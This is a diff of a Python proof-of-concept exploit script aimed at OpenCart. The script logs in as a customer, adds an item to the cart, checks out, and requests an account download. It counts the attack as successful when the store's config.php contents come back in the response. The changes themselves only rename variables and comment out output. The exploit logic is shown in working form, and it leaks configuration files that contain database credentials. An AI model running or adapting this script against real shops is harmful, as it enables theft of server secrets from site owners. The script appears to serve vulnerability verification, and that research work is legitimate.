@@ -159,14 +159,13 @@ def download():
     burp0_url = "http://"+host+":80//index.php?route=account/download/download&download_id=1"
     burp0_cookies = {"OCSESSID":cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/download", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
+    rcheck=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     #print(r.status_code)
-    r_check=r.text
-    print(r_check)
-    return r_check
+    #print(rcheck.text) 
+    return rcheck
 
-def check_poc(r_check):
-    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check):
+def check_poc(rcheck):
+    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in rcheck.text):
         print('PoC success!')
         return 0
     else:
@@ -180,7 +179,7 @@ if __name__ == "__main__":
     cus_cookies=logincus()
     addcart()
     checkout()
-    r_check=download()
-    result=check_poc(r_check)
+    rcheck=download()
+    result=check_poc(rcheck)
     exit(result)
  
